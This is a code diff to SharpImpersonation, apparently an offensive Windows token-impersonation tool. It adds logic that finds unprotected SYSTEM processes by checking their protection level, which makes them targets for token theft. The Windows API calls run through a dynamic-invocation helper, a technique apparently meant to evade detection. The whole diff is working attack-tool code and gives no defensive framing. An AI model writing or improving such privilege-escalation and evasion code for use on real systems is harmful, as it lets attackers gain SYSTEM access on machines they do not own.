@@ -191,10 +191,7 @@ namespace SharpImpersonation
                 {
                     Console.WriteLine("[-] OpenProcessToken failed");
                     continue;
-                }
-
-                object[] CloseHandleArgs = { hProcess };
-                InvokeItDynamically.DynGen.DynamicAPIInvoke("kernel32.dll", "CloseHandle", typeof(CloseHandle), ref CloseHandleArgs, true, true);
+                }                
 
                 if (findElevation)
                 {
@@ -251,8 +248,54 @@ namespace SharpImpersonation
 
                 if (!users.ContainsKey(userName))
                 {
-                    users.Add(userName, (UInt32)p.Id);
+                    ////////////////////////////////////////////////////////////////////////////////
+                    // Finds a process with the SYSTEM token that is NOT protected (0xFFFFFFFE)
+                    // https://bit.ly/37ITNWi
+                    // (bitly link for Process Protection entry at docs.microsoft.com)
+                    ////////////////////////////////////////////////////////////////////////////////
+
+                    if (userName == "NT AUTHORITY\\SYSTEM")
+                    {
+                        /* Allocate memory for a new PS_PROTECTION */
+                        _PROCESS_PROTECTION_LEVEL_INFORMATION psProtection = new _PROCESS_PROTECTION_LEVEL_INFORMATION();
+                        IntPtr outLong = Marshal.AllocHGlobal(sizeof(long));
+
+                        /* Prepare the Args for GetProcessInformation */
+                        object[] ProtectionInformationArgs =
+                        {
+                            hProcess, _PROCESS_INFORMATION_CLASS.ProcessProtectionLevelInfo, psProtection, (uint)Marshal.SizeOf(typeof(_PROCESS_PROTECTION_LEVEL_INFORMATION))
+                        };
+
+                        /* Call GetProcessInformation and output Process Protection Level Info */
+                        result = (bool)InvokeItDynamically.DynGen.DynamicAPIInvoke("kernel32.dll", "GetProcessInformation", typeof(GetProcessInformation), ref ProtectionInformationArgs, true, true);
+
+                        if (!result)
+                        {
+                            Console.WriteLine("GetProcessInformation: {0}", Marshal.GetLastWin32Error());
+                            continue;
+                        }
+
+                        /* Ensure that the Process Protection Level is casted and saved to 'psProtection' */
+                        psProtection = (_PROCESS_PROTECTION_LEVEL_INFORMATION)ProtectionInformationArgs[2];
+
+                        /* String Format protHex and IF 'PROTECTION_LEVEL_NONE' (0xFFFFFFFE), then add to 'users' dictionary */
+                        string protHex = psProtection.ProtectionLevel.ToString("x8");
+                        protHex = protHex.ToUpper();
+                        // Console.WriteLine(string.Format("[+] Protection for PID {0} is 0x{1}", (UInt32)p.Id, protHex));
+
+                        if (protHex == "FFFFFFFE")
+                        {
+                            users.Add(userName, (UInt32)p.Id);
+                        }
+                    }
+                    else
+                    {
+                        users.Add(userName, (UInt32)p.Id);
+                    }
                 }
+
+                object[] CloseHandleArgs = { hProcess };
+                InvokeItDynamically.DynGen.DynamicAPIInvoke("kernel32.dll", "CloseHandle", typeof(CloseHandle), ref CloseHandleArgs, true, true);
             }
             return users;
         }
